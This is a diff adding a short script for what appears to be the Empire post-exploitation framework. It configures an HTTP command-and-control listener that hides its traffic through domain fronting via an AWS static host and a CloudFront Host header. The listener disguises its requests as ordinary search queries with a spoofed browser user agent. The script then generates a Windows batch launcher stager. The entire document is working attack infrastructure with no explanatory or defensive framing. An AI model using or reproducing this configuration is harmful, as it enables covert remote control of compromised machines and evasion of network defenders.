@@ -1,0 +1,16 @@
+# OPERATIONS via DOMAIN FRONTING (sadeyedlady)
+
+listeners
+uselistener http
+set Name operations
+set DefaultDelay 3
+set Host http://d0.awsstatic.com:80
+set Port 80
+set DefaultProfile /search?q=sports&go=Search&qs=bs&form=QBRE,/search?q=fashion&go=Search&qs=bs&form=QBRE,/search?q=trends&go=Search&qs=bs&form=QBRE,/search?q=websites&go=Search&qs=bs&form=QBRE,/search?q=images&go=Search&qs=bs&form=QBRE,/search?q=news&go=Search&qs=bs&form=QBRE,/search?q=weather&go=Search&qs=bs&form=QBRE,/search?q=shows%20tickets&go=Search&qs=bs&form=QBRE,/search?q=songs%20conversion&go=Search&qs=bs&form=QBRE|Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko|Host:d2xx82w00xgkht.cloudfront.net|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+execute
+back
+usestager windows/launcher_bat
+set Listener operations
+set OutFile /tmp/operations.bat
+generate
+main
